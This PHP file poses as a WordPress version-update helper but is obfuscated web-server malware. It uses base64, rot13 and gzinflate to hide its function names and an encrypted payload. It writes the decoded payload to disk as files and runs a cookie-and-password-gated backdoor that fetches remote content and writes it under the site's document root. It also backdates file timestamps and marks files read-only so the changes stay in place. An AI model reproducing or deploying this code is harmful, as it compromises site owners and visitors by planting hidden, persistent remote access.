<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("qa{$check}cjvp", '003bdb63a0cd926a85a89a962c7a8588')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}